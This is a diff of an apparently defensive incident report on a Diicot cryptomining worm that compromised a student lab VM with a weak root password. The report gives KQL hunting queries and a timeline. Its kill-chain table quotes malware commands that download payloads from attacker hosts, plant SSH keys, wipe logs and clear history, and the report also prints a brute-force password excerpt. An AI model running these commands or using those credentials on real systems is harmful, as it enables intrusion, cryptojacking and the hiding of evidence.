@@ -75,9 +75,50 @@ The compromise occurred **less than 15 minutes** after the student updated crede
 
 ---
 
-# Investigation
+# Incident Response Lifecycle
 
-### Detection: Malware or PUA Observed in MDE
+### Preparation: Authentication Lab Context
+
+At the time of compromise, the VM was actively being used for a **student lab exercise** designed to intentionally trigger findings for Tenable scans.
+
+**Students are instructed to destroy VM immediately after completion**
+
+<br>
+
+<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />
+
+<br>
+
+Lab configuration included:
+- SSH access intentionally exposed  
+- **Root password set to `root`**  
+- Expected findings in Tenable for followup remediation
+
+<br>
+
+---
+
+### NSG Rules for Cryptomining
+
+- Outbound rules for _SSH_ and common crypto miner ports denied:
+   - Ports 22, 3333, 4444, 5555, etc.
+- VMs can continue Root Labs without scanning outbound IPs, even if compromised
+
+  <br>
+
+  <img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
+
+<Br>
+
+<img width="1120" height="646" alt="image" src="https://github.com/user-attachments/assets/7cc46184-a833-44d7-b9be-7ccb5103f29b" />
+
+<br>
+
+---
+
+# Detection
+
+### Malware or PUA Alert in MDE
 
 - MDE generates alert **Malware or PUA** activity on Linux host
 - Alert correlated with suspicious processes occurring under `root`
@@ -190,26 +231,67 @@ Log Analytics: stores & exposes it
 
 ---
 
-### Authentication Lab Context
+### Student & Malicious IP Logins
 
-At the time of compromise, the VM was actively being used for a **student lab exercise** designed to intentionally trigger findings for Tenable scans.
-
-<br>
-
-<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />
+**Security researchers have measured that:**
+- A newly exposed SSH service often receives login attempts within minutes
+- Sometimes within 30–90 seconds
 
 <br>
 
-Lab configuration included:
-- SSH access intentionally exposed  
-- **Root password set to `root`**  
-- Expected findings in Tenable for followup remediation
+```kql
+DeviceLogonEvents
+| where DeviceName contains "fix-michael"
+| where RemoteIP == "129.212.178.38"
+| where TimeGenerated >= ago(20d)
+| project
+    TimeGenerated,
+    RemoteIP,
+    ActionType,
+    InitiatingProcessAccountName,
+    AccountName,
+    RemoteIPType,
+    InitiatingProcessFolderPath,
+    InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+
+**Student logs on at _1:35:55_ as _labuser_ via SSH**
+- Student begins lab, telnet install & update root password
+
+ <br>
+
+<img width="1155" height="282" alt="image" src="https://github.com/user-attachments/assets/1ccd7da3-8463-4945-9079-bfa2fa9b7cd7" />
 
 <br>
 
----
+**_1:56_ malicious IP beings brute force password attack**
 
-### Student Password Change & First Compromise Artifact
+<Br>
+
+<img width="1154" height="281" alt="image" src="https://github.com/user-attachments/assets/4c2f8d47-b748-4968-9725-d292e27fa7a7" />
+
+<Br>
+
+IP **successfully logs in** at _2:02_
+- Despite the successful login, password guessing continues until 2:30
+- Usernames contain some default Linux service accounts
+
+<br>
+
+<img width="1089" height="311" alt="image" src="https://github.com/user-attachments/assets/06958de7-721f-4657-b420-597eca2d52ba" />
+
+<br>
+
+_labuser_ is one of the usernames attempting to sign in, suggesting the malware has been updated with Cyber Range username context
+
+<Br>
+
+<img width="1082" height="324" alt="image" src="https://github.com/user-attachments/assets/aac7bec9-2e31-4609-b296-1589aaeeb247" />
+
+<Br>
+
+### First Compromise Artifact
 
 - Student begins the lab, changing root password to _root_
    - _2026-01-30T`13:50`:32.826013Z_ — `/etc/shadow` edited by _Labuser_ via root (student password change)
@@ -254,19 +336,6 @@ DeviceFileEvents
 
 <br>
 
-**109.206.236.18 Beaconing** 
-- Compromised VM initiating outbound connection to attacker-controlled server
-
-  <br>
-
-<img width="806" height="207" alt="image" src="https://github.com/user-attachments/assets/049e3c99-f6de-4ae7-8b63-d7eaa04674b7" />
-
-<br>
-
-<img width="1245" height="802" alt="image" src="https://github.com/user-attachments/assets/40f22064-6942-4bd7-b04e-ab5facf4a3ed" />
-
-<br>
-
 ---
 
 ### Malware Injects Password Hash for Root
@@ -291,11 +360,80 @@ DeviceFileEvents
 
  <br>
 
-**Students are instructed to destroy VM asap when lab is finished** to avoid compromise
+**Students are instructed to destroy VM asap when lab is finished** to avoid compromise <br>
 <img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />
 
 <br>
 
+---
+
+### SSH Brute Force on Internal Subnet
+
+**Malware scans internal subnet `10.1.0.0/24`**
+   - Malware uses compromised Cyber Range host to spread
+   - Malware probes IP addresses in the range of _10.1.0.0 – 10.1.0.255_
+   - Scan is looking for IPs that accept SSH connections, _Port 22_
+   - If SSH is open, the malware tries common passwords for user accounts
+     
+    <br>
+   <br>
+   
+**Password exerpt from _retea_ script**
+
+```
+root root
+root rootroot
+root root123
+root root123456
+root 123456
+root 123
+```
+
+ <br>
+
+```kql
+ DeviceNetworkEvents
+| where DeviceName contains "fix-michael"
+| where TimeGenerated >= ago(15d)
+| where RemotePort == "22" 
+| project TimeGenerated, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, Protocol, RemoteIP, RemoteIPType, RemotePort
+| order by TimeGenerated asc
+```
+
+<br>
+
+<img width="1096" height="307" alt="image" src="https://github.com/user-attachments/assets/6efd8585-e0dc-4120-967f-cf6c4eb6779b" />
+
+<Br>
+
+- Each attempt generates a _ConnectionRequest_ log, whether it succeeds or fails
+- No _ConnectionSuccess_ was observed
+- The scan went from 14:02:07 to 14:02:42, the entire subnet in **_less than one second_**
+
+- The subnet gets scanned a second time at 2026-01-31T13:39:56 to 2026-01-31T13:40:45
+- Again, no successfull logins observed
+- This time, from a moved .network file running from memory
+
+<Br>
+
+<img width="1152" height="267" alt="image" src="https://github.com/user-attachments/assets/e9afe133-182e-4145-a527-7cb531667610" />
+
+<br>
+
+**If it successfully logs in, it can restart the whole process:**
+   - Install itself on the new host
+   - Delete competing malware
+   - Run miners (like xmrig or cnrig)
+   - Hide traces (clear logs, remove bash history)
+
+<br>
+
+- Brute Force IP: **129.212.178.38**
+   - Organization: DigitalOcean, LLC
+   - Cloud VPS provider, U.S.
+
+     <br>
+     
 ---
 
 ### diicot
@@ -361,55 +499,6 @@ rm -rf .bash_history ~/.bash_history
 
 **SOURCE: DarkTrace blog** <Br>
 <img width="643" height="583" alt="image" src="https://github.com/user-attachments/assets/d775f701-74fa-44bf-bda9-2ca113e9ff3b" /> <br>
-
-<br>
-
----
-
-## SSH Brute Force on Internal Subnet
-
-**Malware scans internal subnet `10.1.0.0/24`**
-   - Malware probes IP addresses in the range of _10.1.0.0 – 10.1.0.255_
-   - _Port 22 SSH_ → looking for servers that accept SSH connections
-   -  If SSH is open, the malware tries common passwords for user accounts <br>
-   <br>
-   
-**Password exerpt from _retea_ script**
-
-```
-root root
-root rootroot
-root root123
-root root123456
-root 123456
-root 123
-```
-
- <br>
-
-```kql
- DeviceNetworkEvents
-| where DeviceName contains "fix-michael"
-| where TimeGenerated >= ago(15d)
-| where RemotePort == "22" 
-| project TimeGenerated, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, Protocol, RemoteIP, RemoteIPType, RemotePort
-| order by TimeGenerated asc
-```
-
-<br>
-
-<img width="1096" height="307" alt="image" src="https://github.com/user-attachments/assets/6efd8585-e0dc-4120-967f-cf6c4eb6779b" />
-
-<Br>
-
-- Each attempt generates a _ConnectionRequest_ log, whether it succeeds or fails
-- No _ConnectionSuccess_ was observed
-
-**If it successfully logs in, it can restart the whole process:**
-   - Install itself on the new host
-   - Delete competing malware
-   - Run miners (like xmrig or cnrig)
-   - Hide traces (clear logs, remove bash history)
 
 <br>
 
@@ -817,7 +906,9 @@ else
 
 **Malware registration check**
 - If the key matches → do nothing
-- If the key does NOT match → print _'login successful'_ and delete `.retea` 
+- If the key does NOT match → print _'login successful'_ and delete `.retea`
+- This appears to be the malware checking if it has already infected the system
+   - If it has, it will terminate as to not disrupt the current mining 
 
 <br>
 
@@ -998,59 +1089,16 @@ Miner
 
 ---
 
-## Cloud Provider Disables Azure VNet
+# Containment, Eradication, & Recovery
 
-**Cyber Range SOC was previously targeted by this malware** in _May 2025_
-
-- Email recieved: **Notice of Microsoft Azure Subscription Termination** from the **Microsoft Azure Safeguard Team**
-- Case _SIR21183209_
-- even though malware was not deployed by us, it still originates from our environment and is therefore our responsibility
-- Microsoft temporarily **disabled Cyber Range VNet 2**
-
- <br>
-
-<img width="1772" height="1057" alt="image" src="https://github.com/user-attachments/assets/0b716d64-9008-4f0e-b1ab-8562b253104d" />
-
- <br>
- <Br>
-
-<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/38c3fc55-6b59-47c4-b750-b32886a0d29a" />
-
- <br>
- <Br>
-
-<img width="1957" height="1055" alt="image" src="https://github.com/user-attachments/assets/4c4f3dff-2186-42ee-8672-adaf360bdfff" />
-
-<br>
-<br>
+- Student's VM was destroyed on Feb. 03, five days after compromise
+- VM was confirmed to have conducted a subnet scan, but **no successful logins were observed**
+- No evidence of actual cryptomining observed
+- No evidence of wallet id present in logs
 
 ---
 
-## Containment & Eradication
-
-- New outbound rules for _SSH_ and common crypto miner ports denied
-   - Ports 22, 3333, 4444, 5555, etc.
-- VMs can continue Root Labs without scanning outbound IPs, even if compromised
-
-  <br>
-
-  <img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
-
-<Br>
-
-<img width="1120" height="646" alt="image" src="https://github.com/user-attachments/assets/7cc46184-a833-44d7-b9be-7ccb5103f29b" />
-
-<br>
-
-**Cyber Range targeted by malware again** _Jan. 30, 2026_
-- Compromised VM successfully scanned subnet _10.1.0.0/24:22_
-   - No outbound scans observed
-
-<br>
-
----
-
-## Recommended Actions
+#  Post-Event Activity (Lessons Learned)
 
 ### Immediate Recovery
 
@@ -1075,7 +1123,7 @@ Miner
 
 ---
 
-# Conclusion
+### Conclusion
 
 This incident represents a **full Linux system compromise** carried out by the automated **Diicot (_aka Mexals_) cryptomining worm**. The malware successfully exploited intentionally weak authentication settings during a student lab exercise, demonstrating how quickly exposed systems can be overtaken when real-world attack conditions are replicated.
 
@@ -1097,5 +1145,58 @@ Compared to the **April 2025 compromise**, the impact was materially reduced. Up
 - Standard protocols alone may not be enough; layered monitoring and defenses are essential
 - Focusing on the broader compromise patterns can be as sufficient as examining every minor malware action
 
+  <br>
 
+---
+
+# Cryptominer Attack Chain Mappings
+
+| Kill Chain Step | Actions Observed | Script Evidence / Commands |
+|-----------------|-----------------|---------------------------|
+| **Reconnaissance** | No recon occured as malicious IP was scanning the internet for open _SSH_ ports |  _labuser_ was entered as a username for signin |
+| **Weaponization** | Prepares mining payloads and helper binaries | `.diicot`, `cache`, `.teaca`, `kuak`, `p.txt`, `r.txt` |
+| **Delivery** | Downloads payloads redundantly from attacker servers; uses renamed binaries for evasion | `curl http://23.160.56.194/p.txt -o ...` <br> `wget http://23.160.56.194/p.txt -O ...` <br> `good http://23.160.56.194/p.txt -O ...` |
+| **Exploitation** | Executes payloads locally; overwrites SSH keys for persistence | `./ygljglkjgfg0` <br> `./sdf3fslsdf13` <br> `echo "ssh-rsa AAAA..." > ~/.ssh/authorized_keys` |
+| **Installation / Persistence** | Creates hidden directories; sets immutable SSH keys; removes cron jobs; ensures files executable | `chattr +ai ~/.ssh/authorized_keys` <br> `mkdir -p /dev/shm/.x /var/tmp/Documents /tmp/.tmp` <br> `crontab -r` <br> `chmod +x .*` |
+| **Command & Control (C2)** | Downloads additional payloads from attacker domains; signals system readiness to attacker | `wget dinpasiune.com/payload` <br> `curl -O -s -L 85.31.47.99/payload` <br> `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"` |
+| **Actions on Objectives** | Executes mining binaries; kills competing miners; tunes system resources; moves laterally; clears logs for stealth | `./.diicot &` <br> `./cache &` <br> `./payload &` <br> `pkill xmrig cnrig java` <br> `fs.file-max = 2097152` <br> `ulimit -n 99999` <br> `cat /dev/null > /var/log/*` <br> `history -c; rm -rf ~/.bash_history` |
+
+  <br>
+  
+---
+
+# Comparison to April 2025 Compromise
+
+**Cyber Range SOC was previously targeted by this malware** in _April 2025_
+
+- Email recieved: **Notice of Microsoft Azure Subscription Termination** from the **Microsoft Azure Safeguard Team**
+- Case _SIR21183209_
+- Even though malware was not deployed by us, it still originates from our environment and is therefore our responsibility
+- Microsoft temporarily **disabled Cyber Range VNet 2**
+
+ <br>
+
+<img width="1772" height="1057" alt="image" src="https://github.com/user-attachments/assets/0b716d64-9008-4f0e-b1ab-8562b253104d" />
+
+ <br>
+ <Br>
+
+<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/38c3fc55-6b59-47c4-b750-b32886a0d29a" />
+
+ <br>
+ <Br>
+
+<img width="1957" height="1055" alt="image" src="https://github.com/user-attachments/assets/4c4f3dff-2186-42ee-8672-adaf360bdfff" />
+
+<br>
+
+---
+
+**Cyber Range targeted by malware again** _Jan. 30, 2026_
+- Compromised VM successfully scanned subnet _10.1.0.0/24:22_
+   - No successful logins observed 
+   - No outbound scans to public internet observed
+- No followup from Microsoft Azure Safeguard Team 
+
+<br>
 
